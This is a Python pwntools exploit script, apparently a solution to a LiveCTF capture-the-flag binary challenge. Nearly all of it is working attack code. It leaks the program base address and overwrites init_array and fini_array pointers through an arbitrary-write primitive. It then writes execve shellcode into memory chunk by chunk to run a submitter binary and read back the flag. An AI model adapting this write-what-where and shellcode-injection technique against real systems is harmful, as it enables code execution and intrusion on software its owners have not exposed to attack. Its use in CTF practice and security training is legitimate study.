#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../handout/challenge --host localhost --port 31337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

context.terminal = ["tmux", "split", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or os.environ.get('HOST', 'localhost')
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = f'''
b *0x{0x555555554000 + 0x1050:x}
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
time.sleep(0.1)
pie_leak = io.recv(8)
pie_leak = u64(pie_leak)
exe.address = pie_leak
log.info("pie_leak = 0x%x", pie_leak)


time.sleep(0.1)
# io.interactive()

init_array = pie_leak + 0x4330
rwx_fun = pie_leak + 0x1370
writer_fun = pie_leak + 0x2000
fini_array = pie_leak + 0x4338
writes = [
    (init_array, rwx_fun),
    (fini_array, writer_fun)
]

for addr, val in writes:
    log.info("writing 0x%x to 0x%x", val, addr)
    io.send(p64(addr))
    time.sleep(0.1)
    io.send(p64(val))
    time.sleep(0.1)

# pause()

log.info("continuing")
io.send(p64(0))
time.sleep(0.1)

log.info("Winning")
io.send(p32(0))
time.sleep(0.1)

# another pie leak
io.recv(8)
time.sleep(0.1)

sh = asm(shellcraft.execve("./submitter", ["./submitter"], 0))
sh = sh + b"\0"*(8 - len(sh)%8)
writes = []
addr = pie_leak + 0x2140
for i in range(0, len(sh), 8):
    chunk = sh[i:i+8]
    writes.append((addr, u64(chunk)))
    addr += 8

for addr, val in writes:
    log.info("writing 0x%x to 0x%x", val, addr)
    io.send(p64(addr))
    time.sleep(0.1)
    io.send(p64(val))
    time.sleep(0.1)

log.info("continuing")
io.send(p64(0))
time.sleep(1)
# io.interactive()
io.sendline(b"./submitter")
time.sleep(1)

# io.recv(8)


# io.recvline_contains(b"You sent:")
# io.sendline(b"./submitter")
flag = io.recvline_contains(b'LiveCTF{')
idx = flag.find(b"LiveCTF{")
flag = flag[idx:]
flag = flag.decode().strip()
log.info('Flag: %s', flag)

